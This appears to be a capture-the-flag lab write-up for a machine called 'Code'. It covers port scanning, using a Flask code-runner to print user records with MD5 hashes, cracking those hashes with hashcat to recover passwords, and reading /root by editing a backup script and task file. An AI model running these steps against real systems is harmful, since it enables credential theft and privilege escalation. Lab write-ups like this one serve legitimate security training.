
### Target: 10.10.11.62 - Code
### Special Notes:
N/A

#### Start off with an nmap scan of tcp and udp:
```sudo nmap -sS -sV -Pn -p- -T4 -oN $target.nmap -vvv --min-rate 1000 $target```

```sudo nmap -sU $target --defeat-icmp-ratelimit -p- -oN $target.nmap -vvv --min-rate 1000 -T5```


#### Nmap TCP Results
```
Port 5000 open
```

#### Nmap UDP Results
```

```

#### Notes
found a runnable flask app.

Realized that it was a flask app after a couple hours running useless sys commands, so it let me print the app and db variables.

![alt text](image.png)

```python
users = User.query.all()

for user in users:
    print(user.username)
    print(user.password)
```
found the following usernames and hashes:
development 759b74ce43947f5f4c91aeddc3e5bad3 martin 3de6f30c4a09c27fc71932bfc68474be

hashcat let me crack:

```bash

┌──(kali㉿kali)-[~/targets/code]
└─$ sudo hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --show --show

759b74ce43947f5f4c91aeddc3e5bad3:development
                                                                                                                                                    
┌──(kali㉿kali)-[~/targets/code]
└─$ sudo hashcat -m 0 hashes2 /usr/share/wordlists/rockyou.txt --show      
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster


```

task.json file:

```
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```


copied backy.sh to test.sh. allowing the root folder to be read

```bash test.sh script
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/" "/root/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

made new json task to archive root to the tmp folder
```
{
  "destination": "/var/tmp",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/root/"
  ],
  "exclude": [
    ".*"
  ]
}

```